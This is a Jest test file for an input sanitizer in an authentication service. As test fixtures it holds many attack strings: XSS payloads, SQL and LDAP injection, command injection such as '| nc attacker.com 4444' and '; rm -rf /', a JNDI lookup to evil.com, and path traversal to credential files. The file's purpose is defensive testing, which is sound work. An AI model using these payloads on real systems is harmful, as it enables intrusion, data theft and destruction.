import { InputSanitizer } from '../src/services/input-sanitizer';
import { UserRegistrationService } from '../src/services/user-registration';
import { AuthService } from '../src/services/auth-service';
import { PasswordResetService } from '../src/services/password-reset-service';

describe('Input Sanitization and Validation', () => {
  let inputSanitizer: InputSanitizer;
  let userRegistrationService: UserRegistrationService;

  beforeEach(() => {
    inputSanitizer = new InputSanitizer();
  });

  describe('Email Sanitization', () => {
    it('should normalize email addresses to lowercase', () => {
      const inputs = [
        'TEST@EXAMPLE.COM',
        'User@Domain.Com',
        'MixedCase@Email.ORG'
      ];
      
      const expected = [
        'test@example.com',
        'user@domain.com',
        'mixedcase@email.org'
      ];

      inputs.forEach((input, index) => {
        expect(inputSanitizer.sanitizeEmail(input)).toBe(expected[index]);
      });
    });

    it('should trim whitespace from email addresses', () => {
      const inputs = [
        '  test@example.com  ',
        '\nuser@domain.com\n',
        '\t  email@test.org  \t'
      ];

      inputs.forEach(input => {
        const sanitized = inputSanitizer.sanitizeEmail(input);
        expect(sanitized).toBe(sanitized.trim());
        expect(sanitized).not.toContain(' ');
        expect(sanitized).not.toContain('\n');
        expect(sanitized).not.toContain('\t');
      });
    });

    it('should reject email addresses with dangerous characters', () => {
      const maliciousEmails = [
        'test<script>alert(1)</script>@example.com',
        'user@domain.com<img src=x onerror=alert(1)>',
        'email@test.org\'; DROP TABLE users; --',
        'test@example.com\x00null-byte',
        'user@domain.com\r\nX-Header: injection'
      ];

      maliciousEmails.forEach(email => {
        expect(() => inputSanitizer.sanitizeEmail(email))
          .toThrow('Invalid characters in email address');
      });
    });

    it('should handle internationalized domain names safely', () => {
      const idnEmails = [
        'user@xn--nxasmq6b.com', // Chinese domain in punycode
        'test@münchen.de',
        'email@россия.рф'
      ];

      idnEmails.forEach(email => {
        const sanitized = inputSanitizer.sanitizeEmail(email);
        expect(sanitized).toBeDefined();
        expect(sanitized.toLowerCase()).toBe(sanitized);
      });
    });
  });

  describe('Username Sanitization', () => {
    it('should remove dangerous HTML and script tags', () => {
      const maliciousUsernames = [
        'user<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>username',
        'user<iframe src="javascript:alert(1)"></iframe>',
        'user<svg onload=alert(1)>test</svg>'
      ];

      maliciousUsernames.forEach(username => {
        const sanitized = inputSanitizer.sanitizeUsername(username);
        expect(sanitized).not.toContain('<');
        expect(sanitized).not.toContain('>');
        expect(sanitized).not.toContain('script');
        expect(sanitized).not.toContain('onerror');
      });
    });

    it('should normalize Unicode characters to prevent spoofing', () => {
      const spoofingUsernames = [
        'аdmin', // Cyrillic 'а' instead of Latin 'a'
        'admіn', // Cyrillic 'і' instead of Latin 'i'
        'admin\u200b', // Zero-width space
        'admin\uFEFF' // Byte order mark
      ];

      spoofingUsernames.forEach(username => {
        const sanitized = inputSanitizer.sanitizeUsername(username);
        expect(sanitized).toMatch(/^[a-zA-Z0-9_]+$/);
      });
    });

    it('should truncate excessively long usernames', () => {
      const longUsername = 'a'.repeat(1000);
      
      const sanitized = inputSanitizer.sanitizeUsername(longUsername);
      
      expect(sanitized.length).toBeLessThanOrEqual(30);
    });

    it('should handle SQL injection attempts in usernames', () => {
      const sqlInjectionUsernames = [
        "'; DROP TABLE users; --",
        "admin' OR '1'='1",
        "user'; UPDATE users SET role='admin' WHERE id=1; --",
        "1' UNION SELECT * FROM passwords --"
      ];

      sqlInjectionUsernames.forEach(username => {
        const sanitized = inputSanitizer.sanitizeUsername(username);
        expect(sanitized).not.toContain("'");
        expect(sanitized).not.toContain(';');
        expect(sanitized).not.toContain('--');
        expect(sanitized).not.toContain('DROP');
        expect(sanitized).not.toContain('UNION');
      });
    });

    it('should remove or escape special characters', () => {
      const specialCharUsernames = [
        'user@domain',
        'user#hashtag',
        'user$money',
        'user%percent',
        'user&and'
      ];

      specialCharUsernames.forEach(username => {
        const sanitized = inputSanitizer.sanitizeUsername(username);
        expect(sanitized).toMatch(/^[a-zA-Z0-9_]*$/);
      });
    });
  });

  describe('Password Input Sanitization', () => {
    it('should preserve password complexity while removing dangerous characters', () => {
      const password = 'MyP@ssw0rd<script>alert(1)</script>!';
      
      const sanitized = inputSanitizer.sanitizePassword(password);
      
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('</script>');
      expect(sanitized).toContain('MyP@ssw0rd');
      expect(sanitized).toContain('!');
    });

    it('should reject passwords with null bytes', () => {
      const passwordWithNullByte = 'password\x00injection';
      
      expect(() => inputSanitizer.sanitizePassword(passwordWithNullByte))
        .toThrow('Password contains invalid characters');
    });

    it('should handle Unicode passwords safely', () => {
      const unicodePasswords = [
        'pässwörd123!',
        'パスワード123!',
        'пароль123!',
        '密码123!'
      ];

      unicodePasswords.forEach(password => {
        const sanitized = inputSanitizer.sanitizePassword(password);
        expect(sanitized).toBeDefined();
        expect(sanitized.length).toBeGreaterThan(0);
      });
    });

    it('should detect and reject common injection patterns', () => {
      const injectionPasswords = [
        'password\'; DROP TABLE users; --',
        'password" OR 1=1 --',
        'password<script>document.cookie</script>',
        'password${jndi:ldap://evil.com/a}'
      ];

      injectionPasswords.forEach(password => {
        expect(() => inputSanitizer.sanitizePassword(password))
          .toThrow('Password contains potentially dangerous content');
      });
    });
  });

  describe('General Input Validation', () => {
    it('should detect and block common XSS payloads', () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        'javascript:alert(1)',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<body onload=alert(1)>',
        '<div onclick="alert(1)">click</div>',
        '"><script>alert(1)</script>',
        '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>'
      ];

      xssPayloads.forEach(payload => {
        expect(inputSanitizer.containsXSS(payload)).toBe(true);
        expect(() => inputSanitizer.sanitizeGeneral(payload))
          .toThrow('Input contains potentially dangerous content');
      });
    });

    it('should detect SQL injection patterns', () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM passwords --",
        "'; EXEC xp_cmdshell('dir'); --",
        "' AND 1=1 --",
        "' OR 1=1#",
        "admin'/*",
        "' OR 'x'='x"
      ];

      sqlInjectionPayloads.forEach(payload => {
        expect(inputSanitizer.containsSQLInjection(payload)).toBe(true);
      });
    });

    it('should handle LDAP injection attempts', () => {
      const ldapInjectionPayloads = [
        '*)(&',
        '*)(|(objectClass=*))',
        '*)(cn=*))((cn=*',
        '*)(|(mail=*))',
        '*))(cn=*))(|(cn=*'
      ];

      ldapInjectionPayloads.forEach(payload => {
        expect(inputSanitizer.containsLDAPInjection(payload)).toBe(true);
      });
    });

    it('should detect command injection attempts', () => {
      const commandInjectionPayloads = [
        '; ls -la',
        '&& cat /etc/passwd',
        '| nc attacker.com 4444',
        '`whoami`',
        '$(cat /etc/hosts)',
        '; rm -rf /',
        '& ping google.com'
      ];

      commandInjectionPayloads.forEach(payload => {
        expect(inputSanitizer.containsCommandInjection(payload)).toBe(true);
      });
    });

    it('should validate input length limits', () => {
      const extremelyLongInput = 'a'.repeat(100000);
      
      expect(() => inputSanitizer.validateLength(extremelyLongInput, 1000))
        .toThrow('Input exceeds maximum allowed length');
    });

    it('should detect and block directory traversal attempts', () => {
      const traversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc//passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd'
      ];

      traversalPayloads.forEach(payload => {
        expect(inputSanitizer.containsPathTraversal(payload)).toBe(true);
      });
    });
  });

  describe('Content Security Policy (CSP) Validation', () => {
    it('should validate that user content complies with CSP', () => {
      const cspViolatingContent = [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "vbscript:MsgBox(1)",
        "about:blank"
      ];

      cspViolatingContent.forEach(content => {
        expect(inputSanitizer.violatesCSP(content)).toBe(true);
      });
    });

    it('should allow safe content that complies with CSP', () => {
      const safeContent = [
        "https://example.com/safe-resource",
        "mailto:user@example.com",
        "tel:+1234567890",
        "Regular text content",
        "https://cdn.example.com/image.jpg"
      ];

      safeContent.forEach(content => {
        expect(inputSanitizer.violatesCSP(content)).toBe(false);
      });
    });
  });

  describe('File Upload Input Validation', () => {
    it('should validate file extensions', () => {
      const dangerousExtensions = [
        'malware.exe',
        'script.bat',
        'payload.scr',
        'virus.com',
        'trojan.pif',
        'backdoor.vbs'
      ];

      dangerousExtensions.forEach(filename => {
        expect(() => inputSanitizer.validateFileName(filename))
          .toThrow('Dangerous file extension detected');
      });
    });

    it('should detect embedded executables in file names', () => {
      const maliciousFilenames = [
        'image.jpg.exe',
        'document.pdf.scr',
        'photo.png.bat',
        'data.txt.com'
      ];

      maliciousFilenames.forEach(filename => {
        expect(() => inputSanitizer.validateFileName(filename))
          .toThrow('Potentially dangerous file detected');
      });
    });
  });

  describe('Rate Limiting Input Validation', () => {
    it('should validate rate limiting parameters', () => {
      const invalidParams = [
        { maxAttempts: -1 },
        { maxAttempts: 'unlimited' },
        { windowMinutes: 0 },
        { windowMinutes: 'forever' }
      ];

      invalidParams.forEach(params => {
        expect(() => inputSanitizer.validateRateLimitParams(params))
          .toThrow('Invalid rate limiting parameters');
      });
    });

    it('should enforce reasonable limits on rate limiting configuration', () => {
      const extremeParams = [
        { maxAttempts: 1000000 },
        { windowMinutes: 0.001 },
        { lockoutMinutes: 0 }
      ];

      extremeParams.forEach(params => {
        expect(() => inputSanitizer.validateRateLimitParams(params))
          .toThrow('Rate limiting parameters are not secure');
      });
    });
  });

  describe('Integration with Authentication Services', () => {
    it('should sanitize all registration inputs', async () => {
      const maliciousRegistrationData = {
        email: '  TEST<script>@EXAMPLE.COM  ',
        username: 'user<img src=x onerror=alert(1)>',
        password: 'P@ssw0rd<script>alert(1)</script>!'
      };

      const sanitized = inputSanitizer.sanitizeRegistrationData(maliciousRegistrationData);

      expect(sanitized.email).toBe('test@example.com');
      expect(sanitized.username).not.toContain('<');
      expect(sanitized.username).not.toContain('>');
      expect(sanitized.password).not.toContain('<script>');
    });

    it('should sanitize login credentials', () => {
      const maliciousCredentials = {
        email: 'TEST@EXAMPLE.COM<script>',
        password: 'password\'; DROP TABLE users; --'
      };

      expect(() => inputSanitizer.sanitizeLoginCredentials(maliciousCredentials))
        .toThrow('Credentials contain potentially dangerous content');
    });

    it('should sanitize password reset inputs', () => {
      const maliciousResetData = {
        email: 'user@example.com<script>alert(1)</script>',
        token: 'token<img src=x onerror=alert(1)>',
        newPassword: 'newpass\x00injection'
      };

      expect(() => inputSanitizer.sanitizePasswordResetData(maliciousResetData))
        .toThrow('Password reset data contains invalid content');
    });
  });

  describe('Performance and DoS Protection', () => {
    it('should reject extremely large inputs to prevent DoS', () => {
      const massiveInput = 'a'.repeat(10 * 1024 * 1024); // 10MB string
      
      expect(() => inputSanitizer.sanitizeGeneral(massiveInput))
        .toThrow('Input size exceeds maximum allowed limit');
    });

    it('should detect ReDoS (Regular Expression DoS) attempts', () => {
      const redosPayloads = [
        'a'.repeat(10000) + '!',
        'x'.repeat(50000) + 'y',
        '(' + 'a'.repeat(1000) + ')*'
      ];

      redosPayloads.forEach(payload => {
        const start = Date.now();
        try {
          inputSanitizer.sanitizeGeneral(payload);
        } catch (e) {
          const duration = Date.now() - start;
          expect(duration).toBeLessThan(1000); // Should not take more than 1 second
        }
      });
    });

    it('should implement timeout for complex sanitization operations', async () => {
      const complexInput = 'complex'.repeat(10000);
      
      const start = Date.now();
      await inputSanitizer.sanitizeWithTimeout(complexInput, 500);
      const duration = Date.now() - start;
      
      expect(duration).toBeLessThan(600); // Should respect timeout
    });
  });

  describe('Logging and Monitoring', () => {
    it('should log detected malicious inputs', () => {
      const logSpy = jest.spyOn(console, 'warn').mockImplementation();
      
      const maliciousInput = '<script>alert("XSS")</script>';
      
      try {
        inputSanitizer.sanitizeGeneral(maliciousInput);
      } catch (e) {
        // Expected to throw
      }

      expect(logSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          event: 'malicious_input_detected',
          inputType: 'XSS',
          timestamp: expect.any(Number)
        })
      );
      
      logSpy.mockRestore();
    });

    it('should track sanitization statistics', () => {
      const maliciousInputs = [
        '<script>alert(1)</script>',
        "'; DROP TABLE users; --",
        '../../../etc/passwd',
        '${jndi:ldap://evil.com}'
      ];

      maliciousInputs.forEach(input => {
        try {
          inputSanitizer.sanitizeGeneral(input);
        } catch (e) {
          // Expected
        }
      });

      const stats = inputSanitizer.getStatistics();
      
      expect(stats.totalInputsProcessed).toBeGreaterThan(0);
      expect(stats.maliciousInputsDetected).toBe(maliciousInputs.length);
      expect(stats.xssAttemptsBlocked).toBeGreaterThan(0);
      expect(stats.sqlInjectionAttemptsBlocked).toBeGreaterThan(0);
    });
  });
});